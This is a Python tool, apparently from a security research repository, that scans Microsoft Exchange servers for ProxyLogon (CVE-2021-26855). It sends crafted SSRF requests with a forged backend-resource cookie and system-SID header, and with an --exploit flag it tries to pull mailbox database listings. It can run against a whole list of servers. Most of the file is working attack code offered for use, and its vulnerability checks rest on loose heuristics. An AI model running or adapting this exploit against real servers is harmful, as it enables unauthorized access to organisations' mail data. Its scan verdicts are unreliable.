#!/usr/bin/env python3
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#
# Based on public research and exploits for CVE-2021-26855
# Original vulnerability discovered by Orange Tsai (DEVCORE Research Team)
#
# Exploit adapted for repository by:
#  Hyperion Gray Security Research Team
#

"""
ProxyLogon (CVE-2021-26855) Exchange Server SSRF Scanner and Exploit

This tool tests for and exploits the ProxyLogon vulnerability in Microsoft Exchange.
The vulnerability allows unauthenticated SSRF attacks against Exchange servers,
potentially leading to authentication bypass and data exfiltration.

Affected versions:
- Microsoft Exchange Server 2013 (all versions)
- Microsoft Exchange Server 2016 (unpatched)
- Microsoft Exchange Server 2019 (unpatched)

The exploit works by abusing the Exchange Control Panel (ECP) proxy functionality
to make authenticated requests to internal Exchange services.
"""

import argparse
import requests
import sys
import urllib.parse
import json
import time
from urllib.parse import urljoin, urlparse

# Disable SSL warnings for testing
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def test_exchange_accessibility(target, timeout=10, verify_ssl=True):
    """Test if Exchange server is accessible"""
    try:
        # Test common Exchange endpoints
        endpoints = ['/owa/', '/ecp/', '/ews/', '/mapi/']
        
        for endpoint in endpoints:
            url = urljoin(target, endpoint)
            response = requests.get(url, timeout=timeout, verify=verify_ssl, allow_redirects=False)
            
            if response.status_code in [200, 302, 401, 403]:
                return True, f"Exchange accessible via {endpoint}"
        
        return False, "No Exchange endpoints accessible"
        
    except requests.exceptions.RequestException as e:
        return False, f"Connection error: {str(e)}"

def test_proxylogon_vulnerability(target, timeout=10, verify_ssl=True):
    """Test for ProxyLogon vulnerability (CVE-2021-26855)"""
    try:
        # ProxyLogon SSRF test payload
        # This attempts to access internal EWS via ECP proxy
        ssrf_path = "/ecp/DDI/DDIService.svc/GetObject"
        
        # Craft the SSRF payload
        params = {
            'schema': 'OABVirtualDirectory',
            'msExchEcpCanary': '',
            'a': 'b'
        }
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (compatible; ProxyLogonScanner/1.0)',
            'Cookie': 'X-BEResource=localhost~1942062522',
            'msExchLogonMailbox': 'S-1-5-20'
        }
        
        url = urljoin(target, ssrf_path)
        
        response = requests.post(
            url,
            params=params,
            headers=headers,
            timeout=timeout,
            verify=verify_ssl,
            allow_redirects=False
        )
        
        # Analyze response for vulnerability indicators
        if response.status_code == 200:
            # Check response content for successful SSRF
            if 'OABVirtualDirectory' in response.text or 'msExch' in response.text:
                return True, "SSRF successful - ProxyLogon vulnerable"
            elif 'DDI' in response.text:
                return True, "DDI service accessible - likely vulnerable"
        elif response.status_code == 500:
            # Internal server error might indicate vulnerability
            if 'DDI' in response.text or 'Exchange' in response.text:
                return True, "Server error suggests vulnerability"
        elif response.status_code == 401:
            return False, "Authentication required - likely patched"
        elif response.status_code == 404:
            return False, "DDI service not found - likely patched"
        
        return False, f"Unexpected response: {response.status_code}"
        
    except requests.exceptions.RequestException as e:
        return False, f"Request error: {str(e)}"

def get_exchange_version(target, timeout=10, verify_ssl=True):
    """Attempt to determine Exchange version"""
    try:
        # Try to get version from OWA
        owa_url = urljoin(target, '/owa/')
        response = requests.get(owa_url, timeout=timeout, verify=verify_ssl)
        
        # Look for version indicators in response
        if 'X-OWA-Version' in response.headers:
            return response.headers['X-OWA-Version']
        
        # Check HTML content for version info
        if 'Exchange Server' in response.text:
            import re
            version_match = re.search(r'Exchange Server (\d+)', response.text)
            if version_match:
                return f"Exchange {version_match.group(1)}"
        
        return "Unknown Exchange version"
        
    except Exception:
        return "Version detection failed"

def exploit_proxylogon(target, timeout=10, verify_ssl=True):
    """Exploit ProxyLogon to access Exchange data"""
    try:
        # This is a proof-of-concept that demonstrates the vulnerability
        # Real exploitation would involve more complex EWS requests
        
        ssrf_path = "/ecp/DDI/DDIService.svc/GetList"
        
        # Attempt to list mailbox databases
        params = {
            'schema': 'MailboxDatabase',
            'msExchEcpCanary': ''
        }
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (compatible; ProxyLogonExploit/1.0)',
            'Cookie': 'X-BEResource=localhost~1942062522',
            'msExchLogonMailbox': 'S-1-5-20',
            'Content-Type': 'application/json'
        }
        
        url = urljoin(target, ssrf_path)
        
        response = requests.post(
            url,
            params=params,
            headers=headers,
            timeout=timeout,
            verify=verify_ssl
        )
        
        if response.status_code == 200:
            try:
                data = response.json()
                return True, data
            except json.JSONDecodeError:
                return True, response.text
        else:
            return False, f"Exploitation failed: {response.status_code}"
            
    except requests.exceptions.RequestException as e:
        return False, f"Exploitation error: {str(e)}"

def main():
    parser = argparse.ArgumentParser(
        description='ProxyLogon (CVE-2021-26855) Scanner and Exploit',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python exploit.py -t https://mail.example.com
  python exploit.py -f exchange_servers.txt -v
  python exploit.py -t https://mail.example.com --exploit
  python exploit.py -t https://mail.example.com --version-check
        """
    )
    
    parser.add_argument('-t', '--target', help='Target Exchange server URL')
    parser.add_argument('-f', '--file', help='File containing list of Exchange servers')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    parser.add_argument('-q', '--quiet', action='store_true', help='Quiet mode (only show vulnerable targets)')
    parser.add_argument('--timeout', type=int, default=10, help='Request timeout (default: 10)')
    parser.add_argument('--no-ssl-verify', action='store_true', help='Disable SSL certificate verification')
    parser.add_argument('--version-check', action='store_true', help='Attempt to detect Exchange version')
    parser.add_argument('--exploit', action='store_true', help='Attempt to exploit vulnerability')
    parser.add_argument('-o', '--output', help='Save results to JSON file')
    
    args = parser.parse_args()
    
    if not args.target and not args.file:
        parser.error('Must specify either --target or --file')
    
    targets = []
    if args.target:
        targets.append(args.target)
    elif args.file:
        try:
            with open(args.file, 'r') as f:
                targets = [line.strip() for line in f if line.strip() and not line.startswith('#')]
        except Exception as e:
            print(f"Error reading file: {e}")
            return 1
    
    if not targets:
        print("No targets to test")
        return 1
    
    vulnerable_count = 0
    results = []
    
    for target in targets:
        if not target.startswith(('http://', 'https://')):
            target = 'https://' + target
        
        if not args.quiet:
            print(f"Testing {target}...")
        
        result = {'target': target, 'vulnerable': False, 'details': {}}
        
        # Test accessibility
        accessible, access_msg = test_exchange_accessibility(
            target, 
            timeout=args.timeout, 
            verify_ssl=not args.no_ssl_verify
        )
        
        if not accessible:
            if not args.quiet:
                print(f"[INACCESSIBLE] {target} - {access_msg}")
            result['details']['accessibility'] = access_msg
            results.append(result)
            continue
        
        if args.verbose:
            print(f"  Exchange accessible: {access_msg}")
        
        # Check version if requested
        if args.version_check:
            version = get_exchange_version(
                target, 
                timeout=args.timeout, 
                verify_ssl=not args.no_ssl_verify
            )
            result['details']['version'] = version
            if args.verbose:
                print(f"  Version: {version}")
        
        # Test for ProxyLogon vulnerability
        vulnerable, vuln_msg = test_proxylogon_vulnerability(
            target, 
            timeout=args.timeout, 
            verify_ssl=not args.no_ssl_verify
        )
        
        result['vulnerable'] = vulnerable
        result['details']['vulnerability'] = vuln_msg
        
        if vulnerable:
            vulnerable_count += 1
            print(f"[VULNERABLE] {target} - {vuln_msg}")
            
            # Attempt exploitation if requested
            if args.exploit:
                exploit_success, exploit_data = exploit_proxylogon(
                    target, 
                    timeout=args.timeout, 
                    verify_ssl=not args.no_ssl_verify
                )
                
                if exploit_success:
                    print(f"[EXPLOIT] Exploitation successful!")
                    if args.verbose:
                        print(f"  Data: {str(exploit_data)[:200]}...")
                    result['details']['exploit'] = {'success': True, 'data': str(exploit_data)[:500]}
                else:
                    print(f"[EXPLOIT] Exploitation failed: {exploit_data}")
                    result['details']['exploit'] = {'success': False, 'error': exploit_data}
        
        elif not args.quiet:
            print(f"[SAFE] {target} - {vuln_msg}")
        
        results.append(result)
    
    # Save results if requested
    if args.output:
        try:
            with open(args.output, 'w') as f:
                json.dump(results, f, indent=2)
            print(f"Results saved to {args.output}")
        except Exception as e:
            print(f"Error saving results: {e}")
    
    if not args.quiet:
        print(f"\nScan complete. Found {vulnerable_count} vulnerable servers out of {len(targets)} tested.")
        
        if vulnerable_count > 0:
            print("\nCRITICAL: ProxyLogon vulnerable Exchange servers found!")
            print("Apply Microsoft security updates immediately.")
            print("Consider using Microsoft Exchange On-premises Mitigation Tool (EOMT).")
    
    return 0 if vulnerable_count == 0 else 1

if __name__ == '__main__':
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print("\nScan interrupted by user")
        sys.exit(1)